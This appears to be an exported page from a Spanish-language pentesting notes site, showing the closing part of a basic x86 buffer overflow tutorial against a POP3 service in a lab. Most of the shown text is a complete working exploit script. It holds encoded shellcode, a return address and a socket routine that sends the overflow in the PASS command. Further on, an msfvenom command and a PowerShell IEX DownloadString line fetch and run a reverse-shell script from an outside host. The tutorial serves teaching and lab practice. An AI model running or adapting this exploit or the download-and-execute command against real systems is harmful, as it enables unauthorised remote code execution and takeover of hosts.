<span class="token string">b"\x23\x7d\x0b\x48\xb2\x57\x45\xb1\x19\x96\x69\x40\x63\xdf"</span>
<span class="token string">b"\x4e\xbb\x16\x29\xad\x46\x21\xee\xcf\x9c\xa4\xf4\x68\x56"</span>
<span class="token string">b"\x1e\xd0\x89\xbb\xf9\x93\x86\x70\x8d\xfb\x8a\x87\x42\x70"</span>
<span class="token string">b"\xb6\x0c\x65\x56\x3e\x56\x42\x72\x1a\x0c\xeb\x23\xc6\xe3"</span>
<span class="token string">b"\x14\x33\xa9\x5c\xb1\x38\x44\x88\xc8\x63\x01\x7d\xe1\x9b"</span>
<span class="token string">b"\xd1\xe9\x72\xe8\xe3\xb6\x28\x66\x48\x3e\xf7\x71\xaf\x15"</span>
<span class="token string">b"\x4f\xed\x4e\x96\xb0\x24\x95\xc2\xe0\x5e\x3c\x6b\x6b\x9e"</span>
<span class="token string">b"\xc1\xbe\x3c\xce\x6d\x11\xfd\xbe\xcd\xc1\x95\xd4\xc1\x3e"</span>
<span class="token string">b"\x85\xd7\x0b\x57\x2c\x22\xdc\x98\x19\x2d\x3d\x71\x58\x2d"</span>
<span class="token string">b"\x3c\x3a\xd5\xcb\x54\x2c\xb0\x44\xc1\xd5\x99\x1e\x70\x19"</span>
<span class="token string">b"\x34\x5b\xb2\x91\xbb\x9c\x7d\x52\xb1\x8e\xea\x92\x8c\xec"</span>
<span class="token string">b"\xbd\xad\x3a\x98\x22\x3f\xa1\x58\x2c\x5c\x7e\x0f\x79\x92"</span>
<span class="token string">b"\x77\xc5\x97\x8d\x21\xfb\x65\x4b\x09\xbf\xb1\xa8\x94\x3e"</span>
<span class="token string">b"\x37\x94\xb2\x50\x81\x15\xff\x04\x5d\x40\xa9\xf2\x1b\x3a"</span>
<span class="token string">b"\x1b\xac\xf5\x91\xf5\x38\x83\xd9\xc5\x3e\x8c\x37\xb0\xde"</span>
<span class="token string">b"\x3d\xee\x85\xe1\xf2\x66\x02\x9a\xee\x16\xed\x71\xab\x37"</span>
<span class="token string">b"\x0c\x53\xc6\xdf\x89\x36\x6b\x82\x29\xed\xa8\xbb\xa9\x07"</span>
<span class="token string">b"\x51\x38\xb1\x62\x54\x04\x75\x9f\x24\x15\x10\x9f\x9b\x16"</span>
<span class="token string">b"\x31"</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b'PASS '</span> <span class="token operator">+</span> before_eip <span class="token operator">+</span> eip <span class="token operator">+</span> shellcode

<span class="token keyword">def</span> <span class="token function">bof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>

    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>

    banner <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span>banner<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"USER dobliuw"</span> <span class="token operator">+</span> <span class="token string">b'\r\n'</span><span class="token punctuation">)</span>
        response <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload <span class="token operator">+</span> <span class="token string">b'\r\n'</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    bof<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code><button class="copy-code-button">Copy</button></pre></div><div><p>Una vez que tengamos el espacio en memoria de donde se encontrará el OpCode, deberíamos verificar si esto es así, por lo que deberíamos agregar un breakpoint en el immunity debugger para verificar si en algún punto, en la ejecución del programa con nuestras cargas, el registro EIP vale la dirección de memoria ingresada. Si esto es así, el flujo de nuestro BOF va muy bien encaminado, solo faltaría un ultimo retoque. </p></div><div><p>Hasta el momento hayamos el <strong>offset</strong> para saber donde comenzamos a sobrescribir el <strong>registro EIP</strong> (Encargado de apuntar a la siguiente tarea a ejecutar ) para así posteriormente hallar un espacio en memoria que contenga el <strong>OpCode</strong> ( <em>JMP ESP</em> ) el cual es un OpCode que se encarga de hacer que el flujo del programa salte al <strong>registro ESP</strong> ( Encargado de la pila ) para poner esta dirección de memoria como valor del registro EIP, para cargar en la pila nuestro <strong>shellcode</strong> malicioso ( Creado ignorando los <strong>badchars</strong> hallados a partir del <strong>bytearray</strong> probado en el programa ) y como el EIP apunta al OpCode JMP ESP hacer que el flujo del programa salte a la pila (<strong>stack</strong>) donde esta nuestro <strong>shellcode</strong> (Instrucciones a bajo nivel).</p></div><div><p> El problema es que aveces no damos tiempo a que nuestro shellcode se ejecute ya que el procesador no llega a realizarlo en su tiempo, por lo que nos hace falta hacer uso de una de las técnicas que se suele usar en este caso como el uso de NOPs o el desplazamiento de la pila.</p></div><div><p>Por lo que, si quisiéramos hacer uso de NOPs simplemente deberíamos representar el byte <em>\x90</em> varías veces, como 16 o 32 antes del shellcode.<br>
Por otro lado, si quisiéramos hacer uso del desplazamiento de la pila simplemente podríamos hacer otra vez uso de la herramienta de metasploit <strong>nasm_shell.rb</strong> </p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token comment"># NOPs </span>
nops <span class="token operator">=</span> b<span class="token string">"<span class="token entity" title="\x90">\x90</span>"</span>*32

<span class="token comment"># STACK DISPLACEMENT</span>

/usr/share/matasploit-framework/tools/exploit/nasm_shell.rb 
<span class="token comment"># Entramos en modo interactivo y tipeamos: </span>
sub esp,0x10
<span class="token comment"># Esto nos arroja un OpCode (83EC10) decrementa el valor del puntero de pila 10 bytes </span>
stack_displacement <span class="token operator">=</span> b<span class="token string">"<span class="token entity" title="\x83">\x83</span><span class="token entity" title="\xEC">\xEC</span><span class="token entity" title="\x10">\x10</span>"</span>

</code><button class="copy-code-button">Copy</button></pre></div><div><p>De esta manera habríamos explotado un <a data-href="Buffer Overflow" href="notes/4.-cybersecurity/redteam/pentesting/systems/4.-advance/buffer-overflow/buffer-overflow.html" class="internal-link" target="_self" rel="noopener">Buffer Overflow</a> en una arquitectura x86 (32 bits).</p></div><div class="heading-wrapper"><h4 data-heading="Script final:" class="heading" id="Script_final:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Script final:</h4><div class="heading-children"><div><pre class="language-python" tabindex="0"><code class="language-python is-loaded"><span class="token comment">#!/usr/bin/python3 </span>

<span class="token keyword">import</span> socket
<span class="token keyword">import</span> sys 
<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack 
ip <span class="token operator">=</span> <span class="token string">"192.168.1.34"</span>
port <span class="token operator">=</span> <span class="token number">110</span>
offset <span class="token operator">=</span> <span class="token number">4654</span>

before_eip <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span>offset
eip <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"&lt;L"</span><span class="token punctuation">,</span> <span class="token number">0x5f4a358f</span><span class="token punctuation">)</span>
shellcode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">b"\xbd\xb9\xba\x5a\xae\xd9\xe5\xd9\x74\x24\xf4\x5f\x33\xc9"</span>
<span class="token string">b"\xb1\x52\x31\x6f\x12\x83\xc7\x04\x03\xd6\xb4\xb8\x5b\xd4"</span>
<span class="token string">b"\x21\xbe\xa4\x24\xb2\xdf\x2d\xc1\x83\xdf\x4a\x82\xb4\xef"</span>
<span class="token string">b"\x19\xc6\x38\x9b\x4c\xf2\xcb\xe9\x58\xf5\x7c\x47\xbf\x38"</span>
<span class="token string">b"\x7c\xf4\x83\x5b\xfe\x07\xd0\xbb\x3f\xc8\x25\xba\x78\x35"</span>
<span class="token string">b"\xc7\xee\xd1\x31\x7a\x1e\x55\x0f\x47\x95\x25\x81\xcf\x4a"</span>
<span class="token string">b"\xfd\xa0\xfe\xdd\x75\xfb\x20\xdc\x5a\x77\x69\xc6\xbf\xb2"</span>
<span class="token string">b"\x23\x7d\x0b\x48\xb2\x57\x45\xb1\x19\x96\x69\x40\x63\xdf"</span>
<span class="token string">b"\x4e\xbb\x16\x29\xad\x46\x21\xee\xcf\x9c\xa4\xf4\x68\x56"</span>
<span class="token string">b"\x1e\xd0\x89\xbb\xf9\x93\x86\x70\x8d\xfb\x8a\x87\x42\x70"</span>
<span class="token string">b"\xb6\x0c\x65\x56\x3e\x56\x42\x72\x1a\x0c\xeb\x23\xc6\xe3"</span>
<span class="token string">b"\x14\x33\xa9\x5c\xb1\x38\x44\x88\xc8\x63\x01\x7d\xe1\x9b"</span>
<span class="token string">b"\xd1\xe9\x72\xe8\xe3\xb6\x28\x66\x48\x3e\xf7\x71\xaf\x15"</span>
<span class="token string">b"\x4f\xed\x4e\x96\xb0\x24\x95\xc2\xe0\x5e\x3c\x6b\x6b\x9e"</span>
<span class="token string">b"\xc1\xbe\x3c\xce\x6d\x11\xfd\xbe\xcd\xc1\x95\xd4\xc1\x3e"</span>
<span class="token string">b"\x85\xd7\x0b\x57\x2c\x22\xdc\x98\x19\x2d\x3d\x71\x58\x2d"</span>
<span class="token string">b"\x3c\x3a\xd5\xcb\x54\x2c\xb0\x44\xc1\xd5\x99\x1e\x70\x19"</span>
<span class="token string">b"\x34\x5b\xb2\x91\xbb\x9c\x7d\x52\xb1\x8e\xea\x92\x8c\xec"</span>
<span class="token string">b"\xbd\xad\x3a\x98\x22\x3f\xa1\x58\x2c\x5c\x7e\x0f\x79\x92"</span>
<span class="token string">b"\x77\xc5\x97\x8d\x21\xfb\x65\x4b\x09\xbf\xb1\xa8\x94\x3e"</span>
<span class="token string">b"\x37\x94\xb2\x50\x81\x15\xff\x04\x5d\x40\xa9\xf2\x1b\x3a"</span>
<span class="token string">b"\x1b\xac\xf5\x91\xf5\x38\x83\xd9\xc5\x3e\x8c\x37\xb0\xde"</span>
<span class="token string">b"\x3d\xee\x85\xe1\xf2\x66\x02\x9a\xee\x16\xed\x71\xab\x37"</span>
<span class="token string">b"\x0c\x53\xc6\xdf\x89\x36\x6b\x82\x29\xed\xa8\xbb\xa9\x07"</span>
<span class="token string">b"\x51\x38\xb1\x62\x54\x04\x75\x9f\x24\x15\x10\x9f\x9b\x16"</span>
<span class="token string">b"\x31"</span><span class="token punctuation">)</span>

<span class="token comment"># USING NOPS </span>
<span class="token comment">#nops = b"\x90"*16</span>

<span class="token comment"># USING STACK DISPLACEMENT </span>
stack_displacement <span class="token operator">=</span> <span class="token string">b"\x83\xEC\x10"</span>

<span class="token comment"># USING NOPS </span>
<span class="token comment">#payload = b'PASS ' + before_eip + eip + nops + shellcode</span>

<span class="token comment"># USING STACK DISPLACEMENT </span>
payload <span class="token operator">=</span> <span class="token string">b'PASS '</span> <span class="token operator">+</span> before_eip <span class="token operator">+</span> eip <span class="token operator">+</span> stack_displacement <span class="token operator">+</span> shellcode


<span class="token keyword">def</span> <span class="token function">bof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>

    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>

    banner <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span>banner<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"USER dobliuw"</span> <span class="token operator">+</span> <span class="token string">b'\r\n'</span><span class="token punctuation">)</span> <span class="token comment">#\r\n manera de simular ENTER</span>
        response <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload <span class="token operator">+</span> <span class="token string">b'\r\n'</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    bof<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Como adicional, si quisiéramos ejecutar un comando en particular en lugar de entablar una de las <a data-href="Shells" href="notes/4.-cybersecurity/redteam/pentesting/systems/2.-fases-auditoria/2.-explotación/conceptos-expotacion/shells.html" class="internal-link" target="_self" rel="noopener">Shells</a> (<strong>Reverse Shell</strong>), podríamos usar otro payload con la herramienta <strong>msfvenom</strong></p></div><div><p><code>msfvenom -p windows/exec CMD="{command}" --platform windows -a x86 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread</code></p></div><div><p>Por ejemplo el comando podría ser <code>powershell IEX(New-Object Net.WebClient).dowloadString('http://192.168.1.33:443/reverse.ps1')</code> para descargarnos un recurso en particular de nuestra url y posteriormente ejecutarlo con powershell, el script podría ser del <a data-tooltip-position="top" aria-label="https://github.com/samratashok/nishang" rel="noopener" class="external-link" href="https://github.com/samratashok/nishang" target="_blank">repositorio de github de nishang</a>.</p></div><div class="mod-footer"></div></div></div></div></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\4.-advance\buffer-overflow\buffer-overflow-escenarios\buffer-overflow-básico-x86.html#Buffer Overflow básico x86"><div class="tree-item-contents heading-link" heading-name="Buffer Overflow básico x86"><span class="tree-item-title">Buffer Overflow básico x86</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\4.-advance\buffer-overflow\buffer-overflow-escenarios\buffer-overflow-básico-x86.html#Escenario"><div class="tree-item-contents heading-link" heading-name="Escenario"><span class="tree-item-title">Escenario</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\4.-advance\buffer-overflow\buffer-overflow-escenarios\buffer-overflow-básico-x86.html#Basic_Buffer_Overflow_x86"><div class="tree-item-contents heading-link" heading-name="Basic Buffer Overflow x86"><span class="tree-item-title">Basic Buffer Overflow x86</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\4.-advance\buffer-overflow\buffer-overflow-escenarios\buffer-overflow-básico-x86.html#**!mona**"><div class="tree-item-contents heading-link" heading-name="**!mona**"><span class="tree-item-title"><strong>!mona</strong></span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\4.-advance\buffer-overflow\buffer-overflow-escenarios\buffer-overflow-básico-x86.html#**!mona_config_-set_workingfolder_C:\\Users\\{user}\\Desktop\\{new_dir_name}**_(Esto_para_crear_un_directorio_de_trabajo_en_nuestro_escritorio)"><div class="tree-item-contents heading-link" heading-name="**!mona config -set workingfolder C:\\Users\\{user}\\Desktop\\{new_dir_name}** (Esto para crear un directorio de trabajo en nuestro escritorio)"><span class="tree-item-title"><strong>!mona config -set workingfolder C:\Users\{user}\Desktop\{new_dir_name}</strong> (Esto para crear un directorio de trabajo en nuestro escritorio)</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\4.-advance\buffer-overflow\buffer-overflow-escenarios\buffer-overflow-básico-x86.html#**!mona_bytearray_-cpb_&quot;\\0x&quot;**_(Para_crear_un_byte_array_excluyendo_el_null_byte_en_el_directorio_de_trabajo_previamente_creado)"><div class="tree-item-contents heading-link" heading-name="**!mona bytearray -cpb &quot;\\0x&quot;** (Para crear un byte array excluyendo el null byte en el directorio de trabajo previamente creado)"><span class="tree-item-title"><strong>!mona bytearray -cpb "\0x"</strong> (Para crear un byte array excluyendo el null byte en el directorio de trabajo previamente creado)</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\4.-advance\buffer-overflow\buffer-overflow-escenarios\buffer-overflow-básico-x86.html#**!mona_compare_-a_0x{ESP_value}_-f_C:\\Users\\{user}\\Desktop\\{new_dir_name}\\bytearray.bin**"><div class="tree-item-contents heading-link" heading-name="**!mona compare -a 0x{ESP_value} -f C:\\Users\\{user}\\Desktop\\{new_dir_name}\\bytearray.bin**"><span class="tree-item-title"><strong>!mona compare -a 0x{ESP_value} -f C:\Users\{user}\Desktop\{new_dir_name}\bytearray.bin</strong></span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\4.-advance\buffer-overflow\buffer-overflow-escenarios\buffer-overflow-básico-x86.html#Creando_el_shellcode"><div class="tree-item-contents heading-link" heading-name="Creando el shellcode"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Creando el shellcode</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\4.-advance\buffer-overflow\buffer-overflow-escenarios\buffer-overflow-básico-x86.html#Script_final:"><div class="tree-item-contents heading-link" heading-name="Script final:"><span class="tree-item-title">Script final:</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>